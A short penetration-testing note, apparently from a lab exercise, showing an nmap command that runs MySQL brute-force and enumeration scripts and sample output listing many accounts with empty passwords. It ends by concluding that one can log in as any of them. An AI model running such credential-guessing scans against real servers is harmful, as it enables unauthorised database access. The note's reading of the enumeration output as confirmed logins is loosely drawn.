## Scanning MySQL server
```bash
sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*
```
```bash
# Example Output
| mysql-brute: 
| Accounts: 
| root:<empty> - Valid credentials 
|_ Statistics: Performed 45010 guesses in 5 seconds, average tps: 9002.0 
|_mysql-databases: ERROR: Script execution failed (use -d to debug) 
|_mysql-dump-hashes: ERROR: Script execution failed (use -d to debug) 
| mysql-empty-password: 
|_ root account has empty password 
| mysql-enum: 
| Valid usernames: 
| root:<empty> - Valid credentials 
| netadmin:<empty> - Valid credentials 
| guest:<empty> - Valid credentials 
| user:<empty> - Valid credentials 
| web:<empty> - Valid credentials 
| sysadmin:<empty> - Valid credentials 
| administrator:<empty> - Valid credentials 
| webadmin:<empty> - Valid credentials 
| admin:<empty> - Valid credentials 
| test:<empty> - Valid credentials 
|_ Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0
```
- From the output we discover massive User Credential with no Password
- From here we can login as any of them and no need to provide password